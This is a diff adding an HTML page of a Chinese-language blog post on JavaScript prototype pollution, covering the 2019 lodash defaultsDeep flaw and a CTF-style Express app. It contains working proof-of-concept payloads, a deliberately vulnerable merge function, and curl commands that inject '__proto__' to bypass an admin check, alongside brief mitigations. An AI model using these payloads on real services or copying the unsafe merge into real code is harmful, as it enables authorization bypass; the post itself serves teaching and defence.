@@ -1,0 +1,247 @@
+<!DOCTYPE html>
+<html lang="en">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="utf-8">
+  
+  
+  
+    <meta name="description" content="forever young">
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <title>
+    js-prototype-pollution |
+    
+    xqyoung&#39;s blog</title>
+  
+    <link rel="shortcut icon" href="/favicon.ico">
+  
+  <link rel="stylesheet" href="/css/style.css">
+  
+    <link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+  
+  <script src="/js/pace.min.js"></script>
+</head>
+</html>
+<body>
+<main class="content">
+  <section class="outer">
+  <article id="post-js-prototype-pollution" class="article article-type-post" itemscope="" itemprop="blogPost" data-scroll-reveal="">
+
+    <div class="article-inner">
+        
+            <header class="article-header">
+                
+  
+    <h1 class="article-title" itemprop="name">
+      js-prototype-pollution
+    </h1>
+  
+  
+
+
+
+
+            </header>
+            
+
+                
+                    <div class="article-meta">
+                        <a href="/2019/07/21/js-prototype-pollution/" class="article-date">
+  <time datetime="2019-07-21T14:59:04.000Z" itemprop="datePublished">2019-07-21</time>
+</a>
+                            
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/js-基础/">js 基础</a>
+  </div>
+
+                    </div>
+                    
+
+                        
+                            
+    <div class="tocbot"></div>
+
+
+
+
+
+                                
+
+                                    <div class="article-entry" itemprop="articleBody">
+                                        
+
+
+                                            
+
+                                                
+                                                                    <blockquote>
+<p>长草的 github 某一天突然往邮箱狂发了几个 vulnerable dependency 的提醒，才知 lodash 爆漏洞了。该漏洞是个原型污染问题，由开源安全平台 Snyk 的开发者 Liran Tal发现，详情看[这里]。</p>
+</blockquote>
+<h3 id="lodash-漏洞"><a href="#lodash-漏洞" class="headerlink" title="lodash 漏洞"></a>lodash 漏洞</h3><p>lodash 有个 defaultsDeep 方法，也就是默认的深拷贝方法，它能够实现这样的功能：</p>
+<blockquote>
+<p>分配来源对象（该方法的第二个参数）的可枚举属性到目标对象（该方法的第一个参数）所有解析为 undefined 的属性上</p>
+</blockquote>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">_.defaultsDeep(&#123; <span class="string">'a'</span>: &#123; <span class="string">'b'</span>: <span class="number">2</span> &#125; &#125;, &#123; <span class="string">'a'</span>: &#123; <span class="string">'b'</span>: <span class="number">1</span>, <span class="string">'c'</span>: <span class="number">3</span> &#125; &#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 结果</span></span><br><span class="line"></span><br><span class="line">&#123; <span class="string">'a'</span>: &#123; <span class="string">'b'</span>: <span class="number">2</span>, <span class="string">'c'</span>: <span class="number">3</span> &#125; &#125;</span><br></pre></td></tr></table></figure>
+<p>在第二个参数上动些手脚，可以修改对象原型链上的属性：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> mergeFn = <span class="built_in">require</span>(<span class="string">'lodash'</span>).defaultsDeep;</span><br><span class="line"><span class="keyword">const</span> payload = <span class="string">'&#123;"constructor": &#123;"prototype": &#123;"a0": true&#125;&#125;&#125;'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    mergeFn(&#123;&#125;, <span class="built_in">JSON</span>.parse(payload));</span><br><span class="line">    <span class="keyword">if</span> ((&#123;&#125;)[<span class="string">`a0`</span>] === <span class="literal">true</span>) &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">`Vulnerable to Prototype Pollution via <span class="subst">$&#123;payload&#125;</span>`</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">check();</span><br></pre></td></tr></table></figure>
+<p>这里在空对象 <code>{}</code> 上加了一个 <code>a0</code> 熟悉。既然能增加，那么修改也不是问题了，如果修改 <code>toString</code> 原型方法，例如把 <code>payload</code> 换成</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> payload = <span class="string">'&#123;"constructor": &#123;"prototype": &#123;"toString": true&#125;&#125;&#125;'</span></span><br></pre></td></tr></table></figure>
+<p>那么 <code>Object.prototype.toString</code> 就很不安全了。</p>
+<p>lodash 紧急发布的修复中，对第二个拷贝参数作了键值判断</p>
+<p><img src="https://res.cloudinary.com/snyk/image/upload/v1562272212/Screen_Shot_2019-07-04_at_23.29.28.png" alt=""></p>
+<p><img src="https://res.cloudinary.com/snyk/image/upload/v1562272212/Screen_Shot_2019-07-04_at_23.29.28.png" alt=""></p>
+<h3 id="NodeJS-漏洞案例"><a href="#NodeJS-漏洞案例" class="headerlink" title="NodeJS 漏洞案例"></a>NodeJS 漏洞案例</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">'use strict'</span>;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">'express'</span>);</span><br><span class="line"><span class="keyword">const</span> bodyParser = <span class="built_in">require</span>(<span class="string">'body-parser'</span>)</span><br><span class="line"><span class="keyword">const</span> cookieParser = <span class="built_in">require</span>(<span class="string">'cookie-parser'</span>);</span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">'path'</span>);</span><br><span class="line"> </span><br><span class="line"><span class="keyword">const</span> isObject = <span class="function"><span class="params">obj</span> =&gt;</span> obj &amp;&amp; obj.constructor &amp;&amp; obj.constructor === <span class="built_in">Object</span>;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">merge</span>(<span class="params">a, b</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> attr <span class="keyword">in</span> b) &#123;</span><br><span class="line">        <span class="keyword">if</span> (isObject(a[attr]) &amp;&amp; isObject(b[attr])) &#123;</span><br><span class="line">            merge(a[attr], b[attr]);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            a[attr] = b[attr];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> a</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">clone</span>(<span class="params">a</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> merge(&#123;&#125;, a);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// Constants</span></span><br><span class="line"><span class="keyword">const</span> PORT = <span class="number">8080</span>;</span><br><span class="line"><span class="keyword">const</span> HOST = <span class="string">'0.0.0.0'</span>;</span><br><span class="line"><span class="keyword">const</span> admin = &#123;&#125;;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// App</span></span><br><span class="line"><span class="keyword">const</span> app = express();</span><br><span class="line">app.use(bodyParser.json())</span><br><span class="line">app.use(cookieParser());</span><br><span class="line"> </span><br><span class="line">app.use(<span class="string">'/'</span>, express.static(path.join(__dirname, <span class="string">'views'</span>)));</span><br><span class="line">app.post(<span class="string">'/signup'</span>, (req, res) =&gt; &#123;</span><br><span class="line">    <span class="keyword">var</span> body = <span class="built_in">JSON</span>.parse(<span class="built_in">JSON</span>.stringify(req.body));</span><br><span class="line">    <span class="keyword">var</span> copybody = clone(body)</span><br><span class="line">    <span class="keyword">if</span> (copybody.name) &#123;</span><br><span class="line">        res.cookie(<span class="string">'name'</span>, copybody.name).json(&#123;</span><br><span class="line">            <span class="string">"done"</span>: <span class="string">"cookie set"</span></span><br><span class="line">        &#125;);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        res.json(&#123;</span><br><span class="line">            <span class="string">"error"</span>: <span class="string">"cookie not set"</span></span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line">app.get(<span class="string">'/getFlag'</span>, (req, res) =&gt; &#123;</span><br><span class="line">    <span class="keyword">var</span> аdmin = <span class="built_in">JSON</span>.parse(<span class="built_in">JSON</span>.stringify(req.cookies))</span><br><span class="line">    <span class="keyword">if</span> (admin.аdmin == <span class="number">1</span>) &#123;</span><br><span class="line">        res.send(<span class="string">"hackim19&#123;&#125;"</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        res.send(<span class="string">"You are not authorized"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line">app.listen(PORT, HOST);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">`Running on http://<span class="subst">$&#123;HOST&#125;</span>:<span class="subst">$&#123;PORT&#125;</span>`</span>);</span><br></pre></td></tr></table></figure>
+<p>问题出在 <code>merge</code> 函数上，攻击者可以通过以下方式绕过登陆验证：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl -vv --header &apos;Content-type: application/json&apos; -d &apos;&#123;&quot;__proto__&quot;: &#123;&quot;admin&quot;: 1&#125;&#125;&apos; &apos;http://0.0.0.0:4000/signup&apos;; </span><br><span class="line"></span><br><span class="line">curl -vv &apos;http://0.0.0.0:4000/getFlag&apos;</span><br></pre></td></tr></table></figure>
+<p>攻击案例来自：<a href="https://www.youtube.com/watch?v=LUsiFV3dsK8" target="_blank" rel="noopener">https://www.youtube.com/watch?v=LUsiFV3dsK8</a></p>
+<p>像接口数据的校验，就要小心原型被修改的可能。</p>
+<h3 id="原型污染防范"><a href="#原型污染防范" class="headerlink" title="原型污染防范"></a>原型污染防范</h3><ul>
+<li>使用 <code>Object.freeze()</code></li>
+<li>使用 <code>Object.create(null)</code> </li>
+</ul>
+<blockquote>
+<p>参考<br>(Snyk research team discovers severe prototype pollution security vulnerabilities affecting all versions of lodash)[<a href="https://snyk.io/blog/snyk-research-team-discovers-severe-prototype-pollution-security-vulnerabilities-affecting-all-versions-of-lodash/]" target="_blank" rel="noopener">https://snyk.io/blog/snyk-research-team-discovers-severe-prototype-pollution-security-vulnerabilities-affecting-all-versions-of-lodash/]</a></p>
+<p>部分转载自<a href="https://juejin.im/post/5d271332f265da1b934e2d48#heading-2" target="_blank" rel="noopener">最新：Lodash 严重安全漏洞背后你不得不知道的 JavaScript 知识</a></p>
+</blockquote>
+
+                                                                        
+                                    </div>
+                                    <footer class="article-footer">
+                                        <a data-url="http://www.xqyoung.com/2019/07/21/js-prototype-pollution/" data-id="ckbs697ps000urhjcz3k5v8td" class="article-share-link">
+                                            Share
+                                        </a>
+                                        
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/js/">js</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/安全/">安全</a></li></ul>
+
+                                    </footer>
+
+    </div>
+
+    
+        
+  <nav class="article-nav">
+    
+    
+      <a href="/2019/01/05/line-height/" class="article-nav-link">
+        <strong class="article-nav-caption">Older</strong>
+        <div class="article-nav-title">css line-height &amp; vertical-align</div>
+      </a>
+    
+  </nav>
+
+
+            
+
+                
+                    
+                        
+                            
+
+</article>
+</section>
+  <footer class="footer">
+  <div class="outer">
+    <div class="float-right">
+      <ul class="list-inline">
+  
+    <li><i class="fe fe-smile-alt"></i> <span id="busuanzi_value_site_uv"></span></li>
+  
+    <li><i class="fe fe-bookmark"></i> <span id="busuanzi_value_page_pv"></span></li>
+  
+</ul>
+    </div>
+    <ul class="list-inline">
+      <li>&copy; 2020 xqyoung&#39;s blog</li>
+      <li>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a></li>
+      <li>Theme  <a href="https://github.com/zhwangart/hexo-theme-ocean">Ocean</a></li>
+    </ul>
+  </div>
+</footer>
+
+</main>
+<aside class="sidebar">
+  <button class="navbar-toggle"></button>
+<nav class="navbar">
+  
+    <div class="logo">
+      <a href="/"><img src="/images/hexo.svg" alt="xqyoung&#39;s blog"></a>
+    </div>
+  
+  <ul class="nav nav-main">
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="/">Home</a>
+      </li>
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="/archives">Archives</a>
+      </li>
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="/gallery">Gallery</a>
+      </li>
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="/about">About</a>
+      </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link nav-item-search" title="Search">
+        <i class="fe fe-search"></i>
+        Search
+      </a>
+    </li>
+  </ul>
+</nav>
+<nav class="navbar navbar-bottom">
+  <ul class="nav">
+    <li class="nav-item">
+      <div class="totop" id="totop">
+  <i class="fe fe-rocket"></i>
+</div>
+    </li>
+    <li class="nav-item">
+      
+        <a class="nav-item-link" target="_blank" href="/atom.xml" title="RSS Feed">
+          <i class="fe fe-feed"></i>
+        </a>
+      
+    </li>
+  </ul>
+</nav>
+<div class="search-form-wrap">
+  <div class="local-search local-search-plugin">
+  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
+  <div id="local-search-result" class="local-search-result"></div>
+</div>
+</div>
+</aside>
+<script src="/js/jquery-2.0.3.min.js"></script>
+<script src="/js/jquery.justifiedGallery.min.js"></script>
+<script src="/js/lazyload.min.js"></script>
+<script src="/js/busuanzi-2.3.pure.min.js"></script>
+
+  <script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+  <script src="/js/tocbot.min.js"></script>
+  <script>
+    // Tocbot_v4.7.0  http://tscanlin.github.io/tocbot/
+    tocbot.init({
+      tocSelector: '.tocbot',
+      contentSelector: '.article-entry',
+      headingSelector: 'h1, h2, h3, h4, h5, h6',
+      hasInnerContainers: true,
+      scrollSmooth: true,
+      positionFixedSelector: '.tocbot',
+      positionFixedClass: 'is-position-fixed',
+      fixedSidebarOffset: 'auto',
+    });
+  </script>
+
+
+<script src="/js/ocean.js"></script>
+
+</body>
+</html>
